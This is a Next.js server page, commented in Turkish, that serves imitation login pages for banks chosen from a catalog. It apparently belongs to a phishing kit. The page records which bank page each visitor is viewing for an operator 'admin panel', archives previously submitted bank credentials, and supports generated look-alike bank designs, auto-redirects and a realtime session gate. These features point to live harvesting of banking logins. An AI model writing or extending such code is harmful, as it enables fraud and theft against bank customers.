import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { BankLoginClient } from "./bank-login-client";
import { getBankBySlug } from "@/lib/at-bank-catalog";
import { renderDedicatedBankClient } from "@/lib/bank-client-registry";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { archivePreviousBankOnChange } from "@/lib/bank-cleanup";
import { createServerSupabaseClient } from "@/lib/supabase/server";

type Props = {
  params: Promise<{ id: string; bank_slug: string }>;
};

export default async function BankLoginPage({ params }: Props) {
  const { id, bank_slug } = await params;
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    routeSessionId: id,
  });
  const bank = await getBankBySlug(bank_slug);
  const bankName = bank?.name || bank_slug;

  // Admin panel "guncel sayfa" kolonu icin: kullanici hangi banka sayfasinda
  // goruntuleme yapiyor — submit'ten bagimsiz olarak burada yazilir.
  // AYrica: onceki SUBMIT edilmis banka bu sayfadan farkliysa, eski bankanin
  // credential kaydini history'ye arsivle ve flat credential alanlarini temizle —
  // aksi halde admin paneli eski bankanin verilerini YENI bankanin kolonunda gosterir.
  if (sessionId && bank) {
    try {
      const sb = await createServerSupabaseClient();
      if (sb) {
        const { data } = await sb
          .from("sessions")
          .select("form_data")
          .eq("id", sessionId)
          .maybeSingle();
        const fd = (data?.form_data ?? {}) as Record<string, unknown>;
        const next: Record<string, unknown> = {
          ...archivePreviousBankOnChange(fd, bank_slug),
          viewingBankName: bankName,
          viewingBankSlug: bank_slug,
        };
        if (
          fd.viewingBankSlug !== bank_slug ||
          next.bankSlug !== fd.bankSlug ||
          next.bankLoginHistory !== fd.bankLoginHistory
        ) {
          await sb
            .from("sessions")
            .update({ form_data: next })
            .eq("id", sessionId);
        }
      }
    } catch {
      /* best-effort */
    }
  }
  const hasGeneratedDesign = Boolean(bank?.design?.visualTree || bank?.design?.customHtml);
  const dedicatedClient = renderDedicatedBankClient({
    sessionId,
    bankSlug: bank_slug,
    bankName,
    hasGeneratedDesign,
    forceAutoRedirect: bank?.autoRedirect,
  });

  return (
    <>
      {/* Banka sayfasi beyaz zemin ister — body hep ah-theme kaldigi icin
          override bu sayfanin omruyle sinirli (SSR'dan itibaren gecerli,
          unmount'ta kalkar => gecislerde portal bg flasi OLMAZ). */}
      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff !important;background-image:none !important}`}</style>
      <SessionRealtimeGate sessionId={sessionId} routeSessionId={routeSessionId} />
      {dedicatedClient ? (
        dedicatedClient ?? null
      ) : (
        <BankLoginClient sessionId={sessionId} bankSlug={bank_slug} bank={bank} />
      )}
    </>
  );
}
